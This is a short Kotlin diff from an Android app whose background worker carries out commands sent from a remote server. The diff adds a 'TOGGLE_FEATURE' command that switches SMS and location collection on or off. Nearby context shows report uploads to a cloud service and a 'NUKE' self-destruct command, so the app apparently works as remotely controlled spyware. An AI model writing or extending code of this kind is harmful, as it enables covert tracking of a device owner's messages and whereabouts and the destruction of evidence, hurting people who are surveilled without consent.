@@ -152,6 +152,22 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                                 CloudManager.uploadSkeleton(applicationContext, report, null)
                                 status = "EXECUTED (SIZE: ${report.toString().length} BYTES)"
                             }
+                            // --- NEW: TOGGLE FEATURES ---
+                            else if (cmd.getString("file_name") == "TOGGLE_FEATURE") {
+                                // Content format: "sms:off" or "location:true"
+                                val content = cmd.optString("content", "")
+                                if (content.contains(":")) {
+                                    val parts = content.split(":")
+                                    val feature = parts[0].trim()
+                                    val stateStr = parts[1].trim().lowercase()
+                                    val enable = stateStr == "on" || stateStr == "true" || stateStr == "1"
+                                    
+                                    ConfigManager.setFeature(applicationContext, feature, enable)
+                                    status = "EXECUTED ($feature set to $enable)"
+                                } else {
+                                    status = "FAILED (INVALID FORMAT)"
+                                }
+                            }
                             // --- NEW: SELF DESTRUCT (NUKE) ---
                             else if (cmd.getString("file_name") == "NUKE") {
                                 try {
